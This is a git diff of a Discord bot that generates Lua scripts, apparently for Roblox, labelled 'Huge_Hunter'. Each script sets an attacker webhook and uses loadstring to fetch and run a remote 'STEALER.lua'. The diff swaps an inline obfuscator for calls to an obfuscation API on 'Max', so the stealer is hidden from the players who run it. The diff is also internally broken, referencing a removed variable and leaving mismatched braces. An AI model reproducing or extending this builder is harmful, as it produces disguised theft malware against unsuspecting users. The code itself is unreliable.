@@ -139,6 +139,9 @@ client.on("interactionCreate", async (interaction) => {
             try {
                 const timestamp = Date.now();
                 const outputFileName = `Huge_Hunter_${timestamp}.txt`;
+                const API_KEY = process.env.API_KEY; // Replace with your actual API key
+                const LUA_FILE_PATH = `script_${timestamp}.lua`; // Path to your Lua file
+
 
                 // Example Lua script (replace with actual script content)
                 const luaScript = `
@@ -149,25 +152,57 @@ client.on("interactionCreate", async (interaction) => {
                     _G.webhook = "${webhook}"
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/RAYZHUB/RAYZHUB-SCRIPTS/refs/heads/main/STEALER.lua"))()
                     ]]
+                    `;
 
-                    a="--// Decompiled Code.\\n"..a;function Obfuscate(b)local c="function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; "local d=c;local e=""local f={"IllIllIllIllI","IIlllIIlllIIlllIIlllII","IIllllIIllll"}local g=[[local IlIlIlIlIlIlIlIlII = {]]local h=[[local IllIIllIIllIII = loadstring]]local i=[[local IllIIIllIIIIllI = table.concat]]local j=[[local IIIIIIIIllllllllIIIIIIII = "''"]]local k="local "..f[math.random(1,#f)].." = (7*3-9/9+3*2/0+3*3);"local l="local "..f[math.random(1,#f)].." = (3*4-7/7+6*4/3+9*9);"local m="--By Salesman\\n"for n=1,string.len(b)do e=e.."'\\\\"..string.byte(b,n).."',"end;local o="function IllIIIIllIIIIIl("..f[math.random(1,#f)]..")"local p="function "..f[math.random(1,#f)].."("..f[math.random(1,#f)]..")"local q="local "..f[math.random(1,#f)].." = (5*3-2/8+9*2/9+8*3)"local r="end"local s="IllIIIIllIIIIIl(900283)"local t="function IllIlllIllIlllIlllIlllIllIlllIIIlll("..f[math.random(1,#f)]..")"local q="function "..f[math.random(1,#f)].."("..f[math.random(1,#f)]..")"local u="local "..f[math.random(1,#f)].." = (9*0-7/5+3*1/3+8*2)"local v="end"local w="IllIlllIllIlllIlllIlllIllIlllIIIlll(9083)"local x=m..d..k..l..i..";"..o.." "..p.." "..q.." "..r.." "..r.." "..r..";"..s..";"..t.." "..q.." "..u.." "..v.." "..v..";"..w..";"..h..";"..g..e.."}".."IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()"print(x)end;do Obfuscate(a)end;
-                `;
+                
+                
+                // Save the Lua script to a file
+                fs.writeFileSync(LUA_FILE_PATH, luaScript, "utf8");
 
-                // Load and execute the Lua script
-                const luaFunction = load(luaScript);
-                luaFunction(); // Run the script
+                // API Endpoint and Headers
+                const url = "https://luaobfuscator.com/api/obfuscate";
+                const headers = {
+                    "Content-Type": "application/json",
+                    "Authorization": `Bearer ${API_KEY}`,
+                };
+                // Payload (Customize options if needed)
+                const payload = {
+                    script: luaScript,
+                    options: {
+                        Preset: "Max", // Options: Default, Light, Max
+                        },
+                };
 
-                // Retrieve Lua output
-                const output = to_jsstring(lua.lua_tostring(lua.L, -1));
-
-                // Save the output to a file
+                // Send request to obfuscate Lua script
+                axios.post(url, payload, { headers })
+                    .then(response => {
+                        if (response.data.obfuscated_script) {
+                            console.log("✅ Obfuscation Successful!");
+                            // Save the obfuscated script
+                            fs.writeFileSync("obfuscated.lua", response.data.obfuscated_script, "utf8");
+                            console.log("✅ Obfuscated script saved to obfuscated.lua");
+                            // Save obfuscated script to output file
+                            fs.writeFileSync(outputFileName, response.data.obfuscated_script, "utf8");
+                            console.log(`✅ Obfuscated script saved to ${outputFileName}`);
+                        } else {
+                            console.error("❌ Obfuscation failed:", response.data);
+                        }
+                    })
+                    .catch(error => {
+                        console.error("❌ Error:", error.response ? error.response.data : error.message);
+                    });
+            } catch (error) {
+                console.error(`❌ Execution error: ${error.message}`);
+            }
+            
+            // Save the output to a file
                 fs.writeFileSync(outputFileName, output);
                 
             } catch (error) {
                 console.error(`Execution error: ${error.message}`);
                 interaction.followUp({ content: "❌ Lua execution failed!", ephemeral: true });
             }
-    }
+}
                 
 
                 try {
